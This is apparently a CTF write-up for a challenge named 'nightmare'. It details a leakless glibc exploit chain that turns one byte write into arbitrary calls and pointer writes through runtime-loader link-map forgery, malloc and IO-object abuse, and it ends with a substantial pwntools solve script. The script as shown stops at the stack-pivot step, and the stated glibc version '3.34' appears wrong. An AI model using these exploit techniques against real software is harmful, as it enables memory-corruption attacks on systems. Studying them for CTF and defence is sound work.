---
来源: https://blog.pepsipu.com/posts/nightmare
类型: html
获取日期: 2026-09-12
---

## Introduction

Attacks on the GNU C library have been wide and thorough. Many of the complex surfaces in the library, such as `malloc` or IO, have been thoroughly deconstructed and analyzed to be utilized in exploit chains. However, one surface, the runtime loader, is yet to be brought into its full potential. `rtld`, as it’s called, is rich with complexity and interesting gadgets for a variety of reasons.

### Background

Let’s go a little more in-depth on `rtld`. First, the runtime loader is provided by a shared library named `ld.so` bundled alongside `libc.so`. If you’ve ever seen a virtual memory map of a process, it’s almost certain you’ll see both `ld.so` and `libc.so` in there *somewhere*. The ubiquity of both makes them very valuable targets for exploitation.

Another neat fact is `libc.so` and `ld.so` are *consistently spaced* in memory. They’ll be at consistent offsets from each other! This is a byproduct of something known as `mmap` relativity, where pages allocated by `mmap` are usually adjacent, and if not, always at a relative offset. This will be useful later.

We’ve seen some eyes on `rtld` though! Take a look at [zehn](https://hxp.io/blog/92/hxp-CTF-2021-zehn-writeup/) from hxpCTF 2021. Given the ability to write bytes into `mmap` relative space, such as where `ld.so` and `libc.so` is loaded, hxp showcases the implementation of a call function primitive using 12 bits of brute force. Another usage of `rtld` is in `ret2dlresolve`, an exploit strategy where libc functions such as `system` can be called by building a ROP chain using only binary space addresses.

### Challenge

It’s worth noting that nightmare as a challenge is contrived. There are several arbitrary restrictions imposed to force competitors to build more powerful primitives under extremely high constraints.

These restrictions include:

* Seccomp with open/read/write/mmap to prevent shell/shellcode.
* Closed IO to prevent leaking mmap base.
* Static payload run against 8 different challenge instances to prevent brute force.

This sets the competitors’ sights on building a ROP chain completely blind.

### Impact

The solution to nightmare introduces a variety of primitives that, until now, were inaccessible through libc as well as some novel exploit strategies by binding together attacks on the runtime loader, `malloc`, and IO objects to ultimately craft and execute an arbitrary ROP chain without ever knowing ASLR base. All that is required is a single byte write into `mmap` relative space.

It is unlikely such an exploit will be useful outside of CTF given the abundance of primitives in real targets. All steps are reproducible on the latest GLIBC version, 3.34 as of date.

## First Steps

First, we should probably take a look at the source code.

```
void __attribute__((constructor)) nightmare()
{
    if (!chunk)
    {
        chunk = malloc(0x40000);
        seccomp();
    }
    uint8_t byte = 0;
    size_t offset = 0;

    read(0, &offset, sizeof(size_t));
    read(0, &byte, sizeof(uint8_t));

    chunk[offset] = byte;

    write(1, "BORN TO WRITE WORLD IS A CHUNK 鬼神 LSB Em All 1972 I am mov man 410,757,864,530 CORRUPTED POINTERS", 101);
    _Exit(0);
}

int main()
{
    _Exit(0);
}
```

Although this `__attribute__((constructor))` tag looks a little intimidating, a quick view at the docs tells us that code marked as a “constructor” will run before `main`.

Further looking at the program, we see it allocates a chunk with `malloc`, then reads an offset and a byte from the user. It’ll then write that byte at the supplied offset from the allocated chunk. Then, it quits with exit, but printing a friendly little message before quitting.

Notice the size of the allocation. Knowing `malloc` uses `mmap` for larger chunks, rather than servicing the request on the heap, we know we can write this byte anywhere to `mmap` relative memory! Remember our laws of `mmap`, that all `mmap` pages are adjacent or, at the least, consistently spaced.

So, our primitive is one byte write in `mmap` space. Well, where do we put it?

### Preliminary Analysis

First, it’s important to note that it is simply *impossible* for one byte to encode “build me an arbitrary ROP chain” with only a measly 8 bits of entropy. Rather, we should shift our focus to obtaining more byte writes instead and worry about what to do from there later.

Notice the order of the functions in the binary.

* `nightmare`
* `main`
* `__libc_csu_init`, which, if you read the documentation about constructors, calls `nightmare`.

#### GCC Optimization Nightmare

The attribute `noreturn` is applied to functions that, well, don’t return. `_Exit` is one of these functions. It has two main effects:

* A `ret` instruction is not inserted at the end of the function body.
* It has a “cascading” property, where if a `noreturn` function is called at the end of another function, that function will also be marked as `noreturn`.

So, GCC will optimize `nightmare` and `main` as `noreturn` and they won’t have return instructions after their calls to `_Exit`. Normally, this works out just fine since `_Exit` truly never returns.

However, if it did, we would slide into `main` after `nightmare` finishes and then slide into `__libc_csu_init` after `main` finishes, which after calling `nightmare` would then infinitely loop this process. That’ll give us infinite byte writes!

We’ve now reduced our goal from “loop the program” to “force `_Exit` to return”. To do this, we’ll need to build some primitives by exploiting our complex surfaces.

### Complex Surface Inventory

Now, let’s take inventory of our complex surfaces. After our write, we have two function calls, `write` and `_Exit`. Let’s check the source code for both to see what we can exploit.

```
// _Exit is aliased to _exit
void _exit (int status)
{
  while (1)
    {
      INLINE_SYSCALL (exit_group, 1, status);
      INLINE_SYSCALL (exit, 1, status);
      ABORT_INSTRUCTION;
    }
}

ssize_t __libc_write (int fd, const void *buf, size_t nbytes)
{
  return SYSCALL_CANCEL (write, fd, buf, nbytes);
}
```

Oh no! Both of these functions don’t even reference writable memory! They’re just thin wrappers over their associated system calls. Clearly, we cannot attack either with our one-byte write. So, what do we do?

We’ll need to dig deeper to find the complex surface out of sight. A `checksec` of the binary will cause the surface to reveal itself:

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
```

Partial RELRO! If you’ve done CTF in the past, maybe you’ll know that with partial RELRO, imported symbols from libraries will be written to the GOT, which is marked as *writeable*. This is because, with partial RELRO, symbols are loaded “lazily”, requesting each import only as it’s needed. Once the import is done, it’ll write the resulting address to the GOT so it doesn’t need to be loaded on the next call. That’s why the GOT is writable here.

Notice that both `exit` and `write` will be imported after the write thanks to lazy loading. However, to most people, the process of importing symbols from another library is a mystery, a mystery whose answers are shrouded deep within the runtime loader.

## Exploiting Runtime Resolution of Symbols

To no one’s surprise, resolving symbols is a complicated process. That’s a good thing since now we have a complex surface to target!

### Understanding Lazy Symbol Loading with Partial RELRO

Let’s discuss the exact process of resolving a symbol.

When the binary calls `write`, the actual call under the hood is to `write@plt`, which is just a thin wrapper for calling the address in `write@got`. Simple so far! When the binary is loaded, each symbol in the GOT simply contains`symbol@plt+6`, including `write`. `write@plt+6`’s job is to swap out `write@got` with the location of `write` in the C library.

To most programmers, your exploration stops there. It’s none of your business to know what happens in`write@plt+6`.

However, we must know! We’re attacking the runtime loader after all. Let’s take a look at the disassembly.

![](https://i.imgur.com/6abk6kJ.png)

For comparison, here’s `_Exit@plt+6`.

![](https://i.imgur.com/AEFdKly.png)

There are two key pointers at play here. These two referenced pointers, `data_4008` and `data_4010`, appear right where the global offset table is in memory. There’s also a number associated with each function, 0 for `write` and 5 for `_Exit`. For simplicity, let’s call this number `plt_idx` since it seems to correspond with the order of the PLT functions and GOT entries.

Somehow, `data_4010(data_4008, plt_idx)` resolves the location of a symbol.

Let’s take a look at these pointers in a debugger.

![](https://i.imgur.com/kzGdpDe.png)

`data_4008` contains a weird pointer to an even weirder structure, while `data_4010` contains a pointer to the function and well-defined symbol `_dl_runtime_resolve_fxsave`.

Some research will tell us that the different “runtime resolve save” functions, as they’re called, provide ABI agnostic wrappers around the function `_dl_fixup`.They “save” program state due to ABI uncertainties when calling the foreign function `_dl_fixup`. `_dl_fixup` does the heavy lifting of resolving the symbol. Here, our runtime loader decides to use `_dl_runtime_resolve_fxsave`.

So, our symbol resolver seems to be something like `_dl_fixup(data_4008, plt_idx)`.

### Complexity in `_dl_fixup`

`_dl_fixup(struct link_map *l, ElfW(Word) reloc_arg)` takes two arguments, a “link map” and a “relocation index”.

The “link map”, as it’s called, wraps up all of the relevant information about an ELF into a really neat data structure. It’ll use the link map to figure out what symbol the “relocation index” is referring to, as well as provide a wealth of other needed information to do symbol resolution.

You’re invited to look into the source code for yourself and dig around, but what interested me was the “resolution address” calculation. `_dl_fixup` utilizes information stored in the link map to figure out where `symbol@got`, called the “resolution address”, is located.

Exploiting this would be valuable as if we trick `_dl_fixup` into calculating the wrong resolution address and `write@got` remained `write@plt+6`, we’d never lose `_dl_fixup` as an attack surface after the byte write.

## Program Looping with Resolution Address (Mis)calculation

Let’s analyze how the resolution address is calculated in `_dl_fixup`.

Here’s the two relevant lines of code. Keep in mind that `l` is the link map and `reloc_arg` is the relocation index.

```
const PLTREL *const reloc = (const void *)(D_PTR(l, l_info[DT_JMPREL]) + reloc_offset(pltgot, reloc_arg));
void *const rel_addr = (void *)(l->l_addr + reloc->r_offset);
```

This first line essentially translates to `l->l_info[DT_JMPREL].d_un.d_ptr[reloc_arg]`. That’s a mouthful, so let’s break down each component piece by piece.

### `.dynamic` and `l_info`

When the runtime loader loads an ELF, it locates different data structures, like where destructor functions or the GOT is stored, through entries in the `.dynamic` section. Here’s what a `.dynamic` section looks like.

![](https://i.imgur.com/SDcjtrz.png)

There are two components to each entry, named an `Elf64_Dyn`, a “tag” and a “value”. All the tag does is describe the value, letting the loader what value corresponds to what information about ELF. The runtime loader will read each entry, storing a pointer to each entry in the ELF’s link map.

Specifically, a pointer to each `Elf64_Dyn` will be stored in the link map’s `l_info` array, indexed by the tag. So, if the loader needed to know where the destructor function is in the binary, it can access the `Elf64_Dyn` with `l->l_info[DT_FINI]`.

Getting out the pointer to the destructor function is as simple as accessing the `l->l_info[DT_FINI].d_un.d_ptr`.

Ok, so this `l->l_info[DT_JMPREL].d_un.d_ptr` thing just gives us the location of some table indexed by the relocation index. Each entry has a `r_offset` attribute, which specifies where the resolved address of the symbol should be placed.

Since the `r_offset` attribute is an offset rather than an absolute pointer, we’ll need to add `l->l_addr` to get the resolution address.

### Exploiting Page Alignment

We’ve got lots of things to overwrite here, but with only one byte to work with, we must be picky.

Since the link map is stored in `ld.so`’s memory, it’ll be `mmap` relative and reachable by our byte write. First, let’s noticed that the binary is always aligned to a page boundary, since memory permissions can only be applied per page. This means that `l_addr` will be aligned to a page boundary, or, in other words, its first 12 least significant bits will be zero.

That’s good! This means, by writing our byte to the LSB of `l_addr`, we can add any value from 0 to 255 to our relocation address.

### `write` Write Primitive

This gives us an interesting write primitive, allowing us to write a pointer to `write` anywhere in binary space after `write@got`. Of course, the offset is capped at 255.

Remember, the goal is to cancel `_Exit` from ever being called. Can our new primitive help here?

What if `write` overwrote `_Exit@plt+6` at `_Exit@got`?

Because system calls like `write` fail silently, we can just write `write` to `_Exit@got`. When we do end up calling `_Exit@got`, the arguments won’t match `write`, but the function will still return and we won’t crash.

## Leakless Address Call Primitive with `SYMTAB` and `STRTAB` Overwrites

That was a fun warmup! We’ve learned a lot about link maps and symbol resolution, which will serve us well when we go to more complex exploitation of `_dl_fixup` and associated functions.

Now we have infinite byte writes, how are we going to escalate our write primitive to a “call any address” primitive?

Currently, there isn’t a known way to get this primitive through GLIBC without leaking ASLR base, much less through `_dl_fixup`. No problem! We’ll just have to make one ourselves.

### Revisiting `_dl_fixup` to Gain Static Symbol Resolution

`_dl_fixup` is still filled with much untapped complexity to attack. Let’s take a look.

#### The Power Of Offsets

One of the natures of PIE binaries is that they are, by definition, relocatable. As we’ve seen with `r_offset`, rather than storing a pointer `X` to a resource, the binary stores offset `Y` from the start of the binary and retrieves the resource by calculating `l_addr + X`.

This offset to pointer behavior seems *awfully* exploitable. If we can change these offsets, it’s possible to force a resource to be retrieved incorrectly. We can’t write pointers since we don’t know the ASLR base, but we surely can write offsets.

Claiming that no leakless call primitive exists in GLIBC is a bit of a white lie. Offset calculation is the crux of the [House of Blindess](https://hackmd.io/jmE0VvcTQaaJm6SEWiqUJA) exploit, which I made not too many months ago attacking `_dl_fini`, a function called at the exit of every GLIBC program. The destructor function is calculated as `l_addr + l->l_info[DT_FINI].d_un.d_ptr`, which, with some clever byte writes, can be transformed into any `mmap` relative address without a leak.

Such an exploit is likely possible on `_dl_fixup` thanks to offsets.

### Tales of `_r_debug` and LSB Overwrites

If you’ve read the House Of Blindness writeup, you’ll know that we can cause many resources pointed by an `Elf64_Dyn` to be read from writeable memory instead of the binary with a least significant byte write.

If not, let me introduce you to `_r_debug`.

`l_info` holds a tightly packed array of pointers to `Elf64_Dyn`s located in the `.dynamic` section. With a LSB overwrite, we can make one of these pointers point at another `Elf64_Dyn`. For example, in the context of this binary, we can cause the `l_info[DT_SYMTAB]`, the symbol table `Elf64_Dyn`, to point to the string table `Elf64_Dyn`, `DT_STRTAB`, by overwriting the LSB of `l_info[DT_SYMTAB]` with `0x78`.

The real power of this LSB overwrite comes when we force a `l_info` entry to point at `DT_DEBUG`. This `Elf64_Dyn` contains a pointer to debug information, named `_r_debug`, stored in `ld.so`’s writeable memory. Since this memory is writeable, we can forge any `Elf64_Dyn` value we want!

This is especially potent for resolving arbitrary functions, as we can move the string table, `DT_STRTAB`, over to `_r_debug` and choose what function we’d like to resolve. When `_dl_fixup` tries to see what string our resolution index corresponds to, it’ll read an arbitrary string instead of “write”. If we decided to make this arbitrary string “system”, we’d call the system function.

It’s worth noting this is *not* an arbitrary address call, it only allows us to call any well-defined symbol in the global scope. It also *certainly* will not allow us to craft an arbitrary ROP chain, so we’ve still got much work ahead of us.

## Forging Fake Symbol Tables

Let’s say I move over string table to writeable memory and the binary reads the string `_dl_x86_get_cpu_features`, a function from `ld.so`, instead of `write`. What happens?

Well, how does `_dl_fixup` know where `_dl_x86_get_cpu_features` is located in its memory? Its symbol table, of course! It should then follow that, if we can also move `ld.so`’s symbol table to writeable memory by modifying its link map, we should be able to forge what `_dl_x86_get_cpu_features` resolves to!

Unfortunately, `ld.so` does not have a reference to `_r_debug` in its `.dynamic` section. However, there is one to the global offset table. Since the symbol table is so big and the global offset table is adjacent to the `.bss` section, the entry associated with `_dl_x86_get_cpu_features` will be in writeable memory.

These two modified link maps may sound a bit confusing, so here’s a diagram.

![](https://i.imgur.com/IteAsGa.png)

Entries in the symbol table, or `Elf64_Sym`, specifies the offset from the start of the binary in its `st_value` field. We can just copy all the other values of the original `Elf64_Sym` associated with `_dl_x86_get_cpu_features`, except, we set the offset to whatever we want. This offset will be added to `ld.so`’s `l_addr`, allowing us to call any arbitrary address!

#### Caveat: Versioning Info

Technically, this isn’t going to work without a moderate amount of fixes. I’ll gloss over the minor ones, but the most important one is “versioning”.

Modern binaries utilize versioning to specify which libraries they will import symbols from. A pointer to the “scope”, as it’s called, is stored in the link map’s version field. Older binaries have this set to null, so we’ll need to null it out to utilize the global scope instead of a restricted one.

This isn’t as simple as it sounds because we can only write byte by byte, so in the process of nulling out version info we’d end up referencing it. This can be fixed by temporarily disabling references to the version by utilizing “local” symbols, but this post is already way too long so I’ll leave it to you to check the solve script if you’re interested.

### A Better Call Primitive

This call primitive is subpar at best. Unfortunately, it gives us no argument control, so we’ll need a better one.

For this, we can import a new complex surface by calling the surface’s associated functions. Personally, I’ll be setting up House Of Blindness to give us a similar call primitive with its argument as a pointer to a writeable buffer. I’m sure there are other ways.

## Uncontrolled Pointer Write with `global_max_fast`

Given that there didn’t exist a primitive to call any arbitrary `mmap` relative address leaklessly, there *certainly* doesn’t exist a primitive to write any `mmap` relative address to any `mmap` relative address. However, to build a ROP chain, we *need* this primitive.

It’s a daunting task. However, let’s focus on getting more powerful primitives and working our way to this “write whatever pointer anywhere” primitive.

### Developing a `malloc` Primitive

An extremely common method of writing pointers in `mmap` relative memory is through a `global_max_fast` overwrite in `malloc`.

In short, a pointer to a chunk will be written out of the bounds of the `fastbinY` array located in `main_arena` if `global_max_fast` is larger than the length of the list.

However, we can’t call `malloc`! Our call primitive simply calls any function on a memory address, specifically `&_dl_load_lock` with House Of Blindness, rather than a constant.

### Faking IO Objects with `_IO_str_overflow` & `_IO_str_finish`

IO objects have been hot topics of exploitation for quite a while now. Due to their complexity, they act as powerful attack surfaces.

The allocation and deallocation of internal buffers will act as our `malloc` and `free` primitives.

`_IO_str_overflow` reallocates an IO buffer if `_IO_write_ptr` exceeds `_IO_buf_end`, a condition called a “string overflow”. It simply doubles the old size of the buffer, with an extra 100 bytes as padding.

Turning this behavior into a controlled `malloc` primitive is self-explanatory after viewing the solve script.

`_IO_str_finish` simply frees the allocated buffer, then nulls it out.

From here, we can perform a standard `global_max_fast` attack. It’s worth noting that the size typically will be so large that the pointers written by `free` will be `mmap` relative, meaning we can control their contents with our byte write.

However, these pointers are *before* GLIBC in memory, so we can’t write pointers into the contents of our written pointers. This will be relevant later.

## Forging a Fake Link Map for Arbitrary Pointer Write by Rehitting `_dl_fixup`

In our quest to gain an arbitrary pointer write primitive, `_dl_fixup` stands out. The nature of `_dl_fixup` is to resolve a symbol and write it to a resolution address. By asking the two questions “How does `_dl_fixup` know where `write` is in GLIBC?” or “How does `_dl_fixup` know where `write@got` is located?”, we’ll be able to gain our arbitrary pointer write.

Both the symbol’s address and the resolution address are specified by offsets rather than absolute pointers, so, if we could forge a link map that described the resolution of a symbol with an arbitrary location and arbitrary resolution address, we’d have arbitrary pointer write!

Forging a valid link map that `_dl_fixup` can understand is by no means easy. `struct link_map` is the most complex structure in `ld.so`, with hundreds of entries.

Luckily, `_dl_fixup` only uses a handful. And, if we mark our symbol as a “local” symbol in the fake symbol table, it’ll use even less. We’ll talk about local symbols in a second, but first, let’s try to forge a link map.

### Forging `l_info` with Pointer Writes

As a reminder, `l_info` is an array of pointers to `Elf64_Dyn` entries, which, themselves, contain pointers to their associated resources. Here are the `Elf64_Dyn` that is used by `_dl_fixup`.

Much, much, more is used by `_dl_lookup_symbol_x`, which `_dl_fixup` calls if the symbol is globally located, but, for us, those aren’t relevant.

![](https://i.imgur.com/QvGaqmj.png)

This process is confusing. Because there are double references to different pointers and link maps are by nature complex, there will be a diagram at the end to show you what the fake link map looks like.

For local symbols, `strtab` and `pltgot` aren’t referenced. However, they still need to be valid pointers since the `D_PTR` macro will fetch the actual resource by dereferencing the `Elf64_Dyn`. With our pointer write primitive, we can just set both of them to dereferenceable, although invalid, `Elf64_Dyn` entries.

`l_info[DT_JMPREL]`, on the other hand, needs to be a pointer to a valid `Elf64_Dyn` which points to our fake relocation table. Our fake relocation table will contain a `r_offset` which can be set arbitrarily to specify *where* the resolution address is in memory relative to our fake link map’s `l_addr`.

Luckily, `l_info[DT_JMPREL]` is already a pointer! It’s just chance that the buffer House of Blindness provides contains a pointer at that specific offset. We can modify the LSB of this pointer to make `l_info[DT_JMPREL]` a pointer to a bit before the global offset table.

From there, we can use our pointer write primitive to set the value of this `Elf64_Dyn` to a place we can write the contents to. This lets us forge the relocation table, allowing us to specify where we can write our pointer!

This is conceptually pretty confusing, so take a look at the solve script.

![](https://i.imgur.com/wcYHc6B.png)

### Double Frees and `_IO_save_base`

Unfortunately, for specifying *what* our pointer is, we need to control the `symtab`, specifically `l_info[DT_SYMTAB]`. We aren’t as lucky as we were with `l_info[DT_JMPREL]`, since there isn’t already a pointer here.

Using our pointer write primitive, we can write a valid pointer—let’s call it `symtab_dyn`—to `l_info[DT_SYMTAB]`. However, we can’t write a pointer to `symtab_dyn`, because of the aforementioned restriction of `mmap` ordering. We’ll need to get crafty.

When we free the allocation buffer with `_IO_str_finish`, `_IO_buf_base` is nulled out, preventing a double free. However, not all references to the buffer are gone. Specifically, the ones in `_IO_read_base` are still very much there.

Maybe, if we could free the stale reference to `symtab_dyn` in `_IO_read_base`, we can use `symtab_dyn` in a separate allocation which would use the allocation to store pointers. That way, we’d have pointers in `symtab_dyn`, which we could use as the reference to the fake symbol table.

To do this, we can utilize “backup buffers” in IO objects. `_IO_switch_to_backup_area` swaps `_IO_read_base` and `_IO_save_base`. The reason this is so useful is that we can free `_IO_save_base` with `_IO_free_backup_area` if we set the appropriate flags. This, in essence, is a double free!

### Pointer Provider: `__open_memstream`

We won’t free `symtab_dyn` as is. We’ll modify its chunk header so it’s stored in `tcache` on `free`, that way the next function we call will use `symtab_dyn` on `malloc`.

The next function we’ll call is `__open_memstream`. It’s not particularly complicated and was found with a little searching for functions that call `malloc`. All it’ll do is allocate a buffer and write the address of the `buffer+0x110` at `buffer+0x98`, plus some other boring stuff. How useful!

We’ll modify the LSB of `l_info[DT_SYMTAB]` to `0x90`, so that way it’s `Elf64_Dyn` value will be `symtab_dyn+0x110`. Now, our fake symbol table will be located at `symtab_dyn+0x110`!

Of course, we’ll top things off by writing a pointer to `l_addr` to make all additions to `l_addr` `mmap` relative.

Here’s a quick diagram to make things clearer.

![](https://i.imgur.com/UeE1SxD.png)

Now, by modifying the fake relocation table and fake symbol table and calling `_dl_fixup`, we can adjust what and where we write our pointers, relative to `l_addr`!

## Returning to our ROP Chain with `setcontext`

Often in CTF, when we only get a function call but we need a ROP chain, we rely on the `setcontext` gadget. The specific method to return to a ROP chain can be found on [this post](https://www.willsroot.io/2020/12/yet-another-house-asis-finals-2020-ctf.html) by another DiceGang member, FizzBuzz101, who discovered the method with poortho during ASIS CTF finals.

In short, we chain together a `call [rbx+c]` gadget with `setcontext+61` to return to an arbitrary address. Forging the structure required for this is trivial using our relative address write primitive. This post is already *very* long, so I suggest you check the solve script and FizzBuzz101’s blog if you’d like to learn more.

## Conclusion

The runtime loader is filled with untapped potential for leakless exploits, considering it was built to cater to binaries that didn’t know where they were located in memory.

This challenge was a very fun one to write and solve. I hope to see more exploitation of the runtime loader in CTF soon!

```
#!/usr/bin/env python3

from pwn import *
import struct

exe = ELF("./bin/nightmare")
libc = ELF("./lib/libc.so.6")
ld = ELF("./lib/ld-linux-x86-64.so.2")

context.update(binary=exe, terminal=["tmux", "splitw", "-v"])

# typedef struct {
#        Elf64_Word      st_name;
#        unsigned char   st_info;
#        unsigned char   st_other;
#        Elf64_Half      st_shndx;
#        Elf64_Addr      st_value;
#        Elf64_Xword     st_size;
# } Elf64_Sym;
elf64_sym = struct.Struct("<LBBHQQ")

# typedef struct {
#        Elf64_Addr      r_offset;
#        Elf64_Xword     r_info;
#        Elf64_Sxword    r_addend;
# } Elf64_Rela;
elf64_rela = struct.Struct("<QQq")


class link_map:
    DT_JMPREL = 23
    DT_SYMTAB = 6
    DT_STRTAB = 5
    DT_VER = 50
    DT_FINI = 13
    DT_PLTGOT = 3
    DT_FINI_ARRAY = 26
    DT_FINI_ARRAYSZ = 28

    def __init__(self, offset):
        self.offset = offset

    def l_addr(self):
        return ld.address + self.offset

    def l_info(self, tag):
        return ld.address + self.offset + 0x40 + tag * 8

    def l_init_called(self):
        return self.l_addr() + 0x31C


class rtld_global:
    def __init__(self, offset):
        self.offset = offset

    def _base(self):
        return self.offset

    def _dl_load_lock(self):
        return self.offset + 0x988

    def _dl_stack_used(self):
        return self.offset + 0x988

    def _dl_rtld_map(self):
        return self.offset + 0xA08


class io_obj:
    def __init__(self, offset):
        self.offset = offset

    def _flags(self):
        return self.offset

    def _IO_save_end(self):
        return self.offset + 0x58


def conn():
    if args.LOCAL:
        r = gdb.debug([exe.path])
    if args.DUMP:
        r = process('cat > dump.txt', shell=True)
    else:
        r = remote("localhost", 5001)
    return r


ld.address = 0x270000 - 0x10
libc.address = 0x43000 - 0x10

binary_map = link_map(0x36220)
ld_map = link_map(0x35A48)

_rtld_global = rtld_global(ld.symbols["_rtld_global"])


def write(offset, bytes):
    for i, byte in enumerate(bytes):
        r.send(p64(offset + i, signed=True))
        r.send(p8(byte))


def set_rela_table(table):
    write(
        ld.symbols["_r_debug"],
        table,
    )
    # set reloc table to _r_debug
    write(binary_map.l_info(link_map.DT_JMPREL), p8(0xB8))


def set_sym_table(table):
    write(ld.symbols["_r_debug"] + elf64_sym.size * 2, table)
    write(binary_map.l_info(link_map.DT_SYMTAB), p8(0xB8))


def restore_rela_table():
    write(binary_map.l_info(link_map.DT_JMPREL), p8(0xF8))


def restore_sym_table():
    write(binary_map.l_info(link_map.DT_SYMTAB), p8(0x88))


# implements house of blindness to call a function
def call_fn(fn, arg=b""):
    write(
        binary_map.l_addr(),
        p64(fn - ld.symbols["_r_debug"], signed=True),
    )
    write(_rtld_global._dl_load_lock(), arg)
    write(binary_map.l_init_called(), p8(0xFF))


def page_boundary(size):
    return (size + 0x1000) >> 12 << 12


def malloc(size):
    assert size % 2 == 0
    old_size = int((size - 100) / 2)

    file = FileStructure()
    file._IO_buf_end = old_size
    file._IO_write_ptr = old_size + 1
    file._IO_read_ptr = 0xFFFFFFFFFFFFFFFF
    file._IO_read_end = 0xFFFFFFFFFFFFFFFF
    call_fn(libc.symbols["_IO_str_overflow"], bytes(file)[:0x48])
    # make sure __rtld_mutex_unlock goes without a hitch by setting invalid _kind
    write(_rtld_global._dl_load_lock() + 0x10, p8(0xFF))
    return size


def free():
    call_fn(libc.symbols["_IO_str_finish"])


# global_max_fast ow implementation
page_mem_alloc = 0


def gmf_size(offset):
    return (offset - libc.symbols["main_arena"] + 0x8) * 2 - 0x10


def ptr_write(offset):
    global page_mem_alloc
    # use global_max_fast attack to overwrite
    write(offset, p64(0))
    size = gmf_size(offset)
    A = malloc(size)
    write(libc.symbols["global_max_fast"], p64(0xFFFFFFFFFFFFFFFF))
    # write chunk header
    write(-page_boundary(A) - 8 - page_mem_alloc, p64(size | 1))
    # write fake chunk header for next check
    write(-page_boundary(A) + size - 0x8 - page_mem_alloc, p8(0x50))
    page_mem_alloc += page_boundary(A)
    # write fastbin addr
    free()
    write(libc.symbols["global_max_fast"], p64(0))
    return -page_mem_alloc


r = conn()

# ----------- loop program -----------
# l_addr is always mmap aligned, meaning that the last three nibbles is always 000.
# changing the lsb allows us to add some constant offset to l_addr
# when write@got is resolved, it'll write write@libc to &write@got.
# &write@got is calculated as l_addr + reloc offset, so we can
# write@libc to &exit@libc to cancel exit.
# because of gcc optimizations, no ret is after exit. we'll slide into main,
# which will slide into csu init. that'll call constructors, looping the process.

l_addr_offset = exe.got["_Exit"] - exe.got["write"]
write(binary_map.l_addr(), p8(l_addr_offset))

# ----------- clear version info -----------
# version info will restrict what libraries we can load symbols from, it's a new feature in elfs
# old elfs don't have this feature, so just need to trick ld by clearing the version info ptr
# to remove versioning info, we need to get a static relocation that doesnt access version while we overwrite it

# these are some dummy entires which will just write the address of _init way past the binaries GOT
set_rela_table(elf64_rela.pack(0x4100, 0x200000007, 0))
set_sym_table(elf64_sym.pack(
    0, 0x12, 1, 0, exe.symbols["_init"] - l_addr_offset, 0))
# now, resolving write won't access version info
write(binary_map.l_info(link_map.DT_VER), p64(0))
# reset sym/rela tables
restore_sym_table()
restore_rela_table()


# ----------- replace write@got with _dl_fini -----------
# we need to forge a libc symbol so that we can overwrite write@got with _dl_fini
# to do this, we'll swap out _dl_x86_get_cpu_features's symtable entry with our own, which will resolve to _dl_fini
# to write it to write@got, we'll forge a rela entry for _dl_fini, telling it to write the resolution to write@got

# first, disable destructors from running once we do call _dl_fini. we don't want them to exec mid write.
write(binary_map.l_init_called(), p8(0))
# overwrite lsb of DT_SYMTAB to reference ld's GOT instead of binary's symtab
# the 9th entry should be in a writeable section, right after the GOT
write(
    ld.symbols["_GLOBAL_OFFSET_TABLE_"] + elf64_sym.size * 8,
    elf64_sym.pack(0x166, 0x12, 0x0, 0xD,
                   ld.symbols["_dl_fini"] - ld.address, 0xC),
)
write(ld_map.l_info(link_map.DT_SYMTAB), p8(0xE0))
# we'll attack the 9th symtab entry, _dl_x86_get_cpu_features. to do this, we swap out the strtable of the binary with our own.
# instead of reading write at strtable+0x4b, it'll read _dl_x86_get_cpu_features
write(ld.symbols["_r_debug"] + 0x4B, b"_dl_x86_get_cpu_features")
# move resolve _dl_x86_get_cpu_features instead of write
write(binary_map.l_info(link_map.DT_STRTAB), p8(0xB8))
# write resolution to write
set_rela_table(elf64_rela.pack(
    exe.got["write"] - l_addr_offset, 0x200000007, 0))
# cool! let's bring back our rela table.
restore_rela_table()


# ----------- house of blindness setup -----------
# let's restore l_addr
write(binary_map.l_addr(), p8(0))
# DT_FINI should point at _r_debug
write(binary_map.l_info(link_map.DT_FINI), p8(0xB8))
# make sure DT_FINI_ARRAY doesn't execute
write(binary_map.l_info(link_map.DT_FINI_ARRAY), p64(0))
# make sure __rtld_mutex_unlock gives up by setting invalid _kind
write(_rtld_global._dl_load_lock() + 0x10, p8(0xFF))

# ----------- fake linkmap for _dl_fixup -----------
fake_linkmap = link_map(_rtld_global._dl_load_lock() - ld.address)
symtab_dyn = ptr_write(fake_linkmap.l_info(link_map.DT_SYMTAB))

# ----------- double free to make symtab struct for _dl_fixup -----------
fake_io = io_obj(_rtld_global._dl_load_lock())
# when the swap happens, we still need 0xff at the mutex
write(fake_io._IO_save_end(), p8(0xFF))
# _IO_switch_to_backup_area switches read with save
call_fn(libc.symbols["_IO_switch_to_backup_area"])
# make size of chunk tcache so memstream takes from it
write(symtab_dyn - 0x8, p64(0x200 | 1))
# trick io into thinking we aren't actually swapped
write(fake_io._flags(), p64(0))
# # _IO_free_backup_area will free _IO_save_base, but this time the ptr will end up in tcache
call_fn(libc.symbols["_IO_free_backup_area"])
# pull from tcache and write ptrs into mmap
call_fn(libc.symbols["__open_memstream"])
# move mmap ptr to mmap relative ptr
write(fake_linkmap.l_info(link_map.DT_SYMTAB), p8(0x90))
symtab = symtab_dyn + 0x110

# ----------- complete linkmap for _dl_fixup -----------
strtab = ptr_write(fake_linkmap.l_info(link_map.DT_STRTAB))
pltgot = ptr_write(fake_linkmap.l_info(link_map.DT_PLTGOT))
write(pltgot - 0x8, p64(0))
# jmprel dyn points to right above the got. move it to point to the got.
write(fake_linkmap.l_info(link_map.DT_JMPREL), p8(0xF8))
# now, d_ptr will be an mmaped chunk written to got
jmprel = ptr_write(ld.symbols["_GLOBAL_OFFSET_TABLE_"])
addr = ptr_write(fake_linkmap.l_addr())


def rel_write(where, what):
    write(jmprel + 0x8, elf64_rela.pack(where - addr + 0x10, 0x000000007, 0))
    write(symtab - 0x10, elf64_sym.pack(0, 0x12, 1, 0, what - addr + 0x10, 0))
    call_fn(ld.symbols["_dl_fixup"])


# ----------- stack pivot -----------
# using rdx gadget found at https://www.willsroot.io/2020/12/yet-another-house-asis-finals-2020-ctf.html
# 0x0000000000169e90 : mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]
rbx_write_call = libc.address + 0x169E90
# set rbx to a ptr to our original mmap page
rel_write(_rtld_global._dl_load_lock() + 8, 0)
